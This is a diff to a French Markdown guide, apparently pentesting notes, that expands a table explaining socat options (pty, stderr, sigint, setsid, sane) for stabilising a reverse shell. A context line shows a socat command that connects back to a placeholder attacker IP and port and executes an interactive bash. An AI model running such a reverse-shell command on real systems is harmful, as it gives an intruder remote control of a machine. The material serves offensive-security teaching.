@@ -72,8 +72,11 @@ C'est l'équivalent de faire `stty raw -echo; fg`.
 user@raspberrypi: ~$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-| Argument   | But                                                                           |
-| ---------- | ----------------------------------------------------------------------------- |
-| **pty**    | alloue un pseudoterminal sur la cible -- partie du processus de stabilisation |
-| **stderr** | s'assure que tous les messages d'erreur sont affichés dans le shell           |
-|            |                                                                               |
+| Argument   | But                                                                                                                       |
+| ---------- | ------------------------------------------------------------------------------------------------------------------------- |
+| **pty**    | alloue un pseudoterminal sur la cible -- partie du processus de stabilisation                                             |
+| **stderr** | s'assure que tous les messages d'erreur sont affichés dans le shell                                                       |
+| **sigint** | transmet toutes les commandes Ctrl + C au sous-processus, ce qui nous permet de tuer les commandes à l'intérieur du shell |
+| **setsid** | crée le processus dans une nouvelle session                                                                               |
+| **sane**   |  stabilise le terminal en essayant de le "normaliser".                                                                                                                          |
+
